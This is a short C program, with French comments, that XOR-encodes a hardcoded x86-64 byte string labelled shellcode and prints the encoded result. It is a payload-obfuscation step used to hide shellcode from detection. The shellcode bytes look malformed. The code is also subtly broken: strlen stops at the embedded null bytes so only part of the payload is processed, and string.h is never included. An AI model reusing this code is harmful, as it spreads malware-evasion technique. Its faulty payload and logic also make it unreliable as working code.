#include <stdio.h>

// Fonction pour encoder/decoder avec XOR
void xor_encode(char *data, char *key, int len) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key[i % strlen(key)];
    }
}

int main() {
    char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9a\xe8\x46\x0c\x00\x00\x53\x54\x5f\x52\x57\x59\x41\x50\x0f\x05";
    char key[] = "maClé";
    int len = strlen(shellcode);

    xor_encode(shellcode, key, len);

    // Shellcode encodé
    printf("Shellcode encodé : ");
    for (int i = 0; i < len; i++) {
        printf("\\x%02x", shellcode[i]);
    }
    printf("\n");

    return 0;
}
